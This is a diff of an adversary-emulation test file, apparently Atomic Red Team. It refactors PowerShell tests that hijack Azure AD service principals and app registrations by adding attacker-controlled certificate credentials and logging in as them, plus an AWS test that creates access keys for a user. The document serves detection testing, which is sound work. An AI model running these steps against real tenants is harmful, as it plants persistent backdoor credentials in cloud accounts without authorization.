@@ -12,24 +12,16 @@ atomic_tests:
   input_arguments:
     username:
       description: Azure AD username
-      type: String
+      type: string
       default: jonh@contoso.com
     password:
       description: Azure AD password
-      type: String
+      type: string
       default: p4sswd
     service_principal_name:
       description: Name of the targeted service principal
-      type: String
+      type: string
       default: SuperSP
-    certificate_password:
-      description: Password of the new certificate
-      type: String
-      default: Passw0rd
-    path_to_cert:
-      description: Path of the new certificate, locally stored 
-      type: String
-      default: $env:TEMP
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -49,21 +41,18 @@ atomic_tests:
       if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
 
       # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
-      $certNotAfter = (Get-Date).AddDays(2)
       $credNotAfter = (Get-Date).AddDays(1)
-      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
-      Write-Host "Generated certificate ""$thumb"""
-      $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
-      Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{service_principal_name}.pfx" -Password $pwd > $null
+      $certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry
 
-      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{service_principal_name}.pfx", $pwd)
+      $cert = New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter
       $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
+      Write-Host "Generated certificate ""$($cert.Thumbprint)"""
 
       New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
 
       Start-Sleep -s 30
       $tenant = Get-AzureADTenantDetail
-      $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb
+      $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint
       Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
       Write-Host "End of Hijacking"
 
@@ -82,8 +71,7 @@ atomic_tests:
         }  
       }
       Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.FriendlyName -eq "AtomicCert" } | Remove-Item
-      rm "#{path_to_cert}\#{service_principal_name}.pfx" -ErrorAction Ignore
-      
+
     name: powershell
     elevation_required: false
 - name: Azure AD Application Hijacking - App Registration
@@ -97,24 +85,16 @@ atomic_tests:
   input_arguments:
     username:
       description: Azure AD username
-      type: String
+      type: string
       default: jonh@contoso.com
     password:
       description: Azure AD password
-      type: String
+      type: string
       default: p4sswd
     application_name:
-      description: Name of the targeted application 
-      type: String
+      description: Name of the targeted application
+      type: string
       default: SuperApp
-    certificate_password:
-      description: Password of the new certificate
-      type: String
-      default: Passw0rd
-    path_to_cert:
-      description: Path of the new certificate, locally stored 
-      type: String
-      default: $env:TEMP
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -134,21 +114,18 @@ atomic_tests:
       if ($app -eq $null) { Write-Warning "Application not found"; exit }
 
       # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
-      $certNotAfter = (Get-Date).AddDays(2)
       $credNotAfter = (Get-Date).AddDays(1)
-      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
-      Write-Host "Generated certificate ""$thumb"""
-      $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
-      Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{application_name}.pfx" -Password $pwd > $null
+      $certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry
 
-      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{application_name}.pfx", $pwd)
+      $cert = New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter
       $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
+      Write-Host "Generated certificate ""$($cert.Thumbprint)"""
 
       New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
 
       Start-Sleep -s 30
       $tenant = Get-AzureADTenantDetail
-      $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb
+      $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint
       Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
       Write-Host "End of Hijacking"
     cleanup_command: |
@@ -166,7 +143,6 @@ atomic_tests:
         }  
       }
       Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.FriendlyName -eq "AtomicCert" } | Remove-Item
-      rm "#{path_to_cert}\#{application_name}.pfx" -ErrorAction Ignore
     name: powershell
     elevation_required: false
 - name: AWS - Create Access Key and Secret Key
@@ -178,15 +154,15 @@ atomic_tests:
   input_arguments:
     username:
       description: Create new AWS access and secret keys for the user
-      type: String
+      type: string
       default: "atomicredteam"
   dependencies:
-    - description: |
-        Check if the user exists.
-      prereq_command: |
-        aws iam list-users | grep #{username}
-      get_prereq_command: |
-        echo Please run atomic test T1136.003, before running this atomic
+  - description: |
+      Check if the user exists.
+    prereq_command: |
+      aws iam list-users | grep #{username}
+    get_prereq_command: |
+      echo Please run atomic test T1136.003, before running this atomic
   executor:
     command: |
       aws iam create-access-key --user-name #{username} > $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds
